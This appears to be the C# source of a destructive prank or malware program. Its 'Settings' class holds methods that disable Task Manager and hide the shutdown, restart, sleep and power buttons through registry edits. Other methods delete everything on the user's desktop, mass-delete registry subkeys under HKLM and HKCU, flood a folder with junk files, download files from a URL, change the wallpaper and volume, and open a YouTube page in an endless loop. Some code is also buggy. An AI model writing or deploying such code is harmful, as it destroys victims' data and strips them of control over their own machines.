using AudioSwitcher.AudioApi.CoreAudio;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace bramerto_rob_2._0
{
    public class Settings
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;
        WebClient wc = new WebClient();
        Random ran = new Random();
        public string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\WOW.jpg";
        public string temp = @"C:\Windows\Temp\W0W.jpg";
        string a = "a";
        string b = "b";
        string c = "c";
        string d = "d";
        string e = "e";
        string f = "f";
        string g = "g";
        string h = "h";
        string i = "i";
        string j = "j";
        string k = "k";
        string l = "l";
        string m = "m";
        string n = "n";
        string o = "o";
        string p = "p";
        string q = "q";
        string r = "r";
        string s = "s";
        string t = "t";
        string u = "u";
        string v = "v";
        string w = "w";
        string x = "x";
        string y = "y";
        string z = "z";
        string zero = "0";
        string one = "1";
        string two = "2";
        string three = "3";
        string four = "4";
        string five = "5";
        string six = "6";
        string seven = "7";
        string eight = "8";
        string nine = "9";

        public void BlockTM()
        {
            RegistryKey a = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (a.GetValue("DisableTaskMgr") == null)
                a.SetValue("DisableTaskMgr", "1");
        }
        public void KillMemory(string path, int time)
        {
            int i2 = 0;
            int x2;
            Random ran = new Random();
            var list = new List<string> { a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, zero, one, two, three, four, five, six, seven, eight, nine };
            while (i2 < time) { int index = ran.Next(list.Count); string result = $"{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}{index}";
                for (x2 = 0; x2 < 10; x2++) { File.Create(path + result); File.Create(path + result); } }
        }

        public void SetVolume(int number)
        {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            Debug.WriteLine("Current Volume:" + defaultPlaybackDevice.Volume);
            defaultPlaybackDevice.Volume = number;
        }

        public void DeleteALLFromDesktop()
        {
            try
            {
                string[] directories = Directory.GetDirectories(desktop);
                foreach (string directory in directories) { Directory.Delete(directory); }
                string[] files = Directory.GetFiles(desktop);
                foreach (string file in files) { File.Delete(file); }
            }
            finally
            {
                string[] files = Directory.GetFiles(desktop);
                foreach (string file in files) { File.Delete(file); }
            }
        }

        public void CreateFilesOnDesktop(int size, string site, string filename)
        {
            string desktop2 = @"C:\Users\" + Environment.UserName + @"\Desktop\" + filename;
            wc.DownloadFile(site, desktop2);
            for (int i = 0; i < size; i++) { string num = desktop + i.ToString() + filename; File.Copy(desktop, num, true); }
        }

        public void SetWallpaper(string path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        public void BlockShutDownButton()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HideShutDown");
            if (key.GetValue("value") == null)
                key.SetValue("value", "1");
        }

        public void BlockSleepButton()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HideSleep");
            if (key.GetValue("value") == null)
                key.SetValue("value", "1");
        }

        public void BlockRestartButton()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HideRestart");
            if (key.GetValue("value") == null)
                key.SetValue("value", "1");
        }

        public void HidePowerButton()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\PolicyManager\default\Start\HidePowerButton");
            if (key.GetValue("value") == null)
                key.SetValue("value", "1");
        }

        public void DeleteSubKey(string subkey, string subkey2, string subkey3)
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(subkey, true))
            {
                string[] subkeys = key.GetSubKeyNames();
                foreach (string delkey in subkeys) { key.DeleteSubKeyTree(delkey, true); }
            }

            using (RegistryKey key2 = Registry.CurrentUser.OpenSubKey(subkey2, true))
            {
                string[] subkeys2 = key2.GetSubKeyNames();
                foreach (string delkey2 in subkeys2) { key2.DeleteSubKeyTree(delkey2, true); }
            }

            using (RegistryKey key3 = Registry.CurrentUser.OpenSubKey(subkey3, true))
            {
                 string[] subkeys3 = key3.GetSubKeyNames();
                 foreach (string delkey3 in subkeys3) { key3.DeleteSubKeyTree(delkey3, true); }
            }
        }

        public void OpenPage()
        {
            int cost = 0;
            while (cost < 1000)
            {
                Process.Start("https://www.youtube.com/watch?v=QDCPKBF7a1Q");
            }
        }
    }
}
